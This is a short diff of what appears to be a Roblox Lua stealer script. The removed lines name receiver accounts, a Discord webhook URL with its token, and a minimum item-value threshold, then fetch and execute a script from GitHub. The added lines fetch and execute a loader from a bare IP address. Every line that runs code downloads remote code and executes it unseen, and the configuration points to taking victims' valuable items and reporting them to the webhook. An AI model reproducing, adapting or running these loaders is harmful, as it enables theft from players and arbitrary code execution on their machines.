@@ -1,4 +1,2 @@
-Username = {"CupidAltAccount55","CupidAltAccount1","BuilderGirls00","FAZE_SHADWO"} 
-Webhook = "https://discord.com/api/webhooks/1429182529885306890/ZZaoQnTG0nOFrb1psKFwLOJZwVXHjEuUOJ-MyDwgzl1MwnfHjyCjbCn1Wbw5NzIwy6N_" 
-min_rap = 10000
-loadstring(game:HttpGet("https://raw.githubusercontent.com/D3ATH-hub/multi/main/all_in_one.lua"))()
+ID="4e086a99-68a3-4845-8e99-01369b1d6065";
+loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
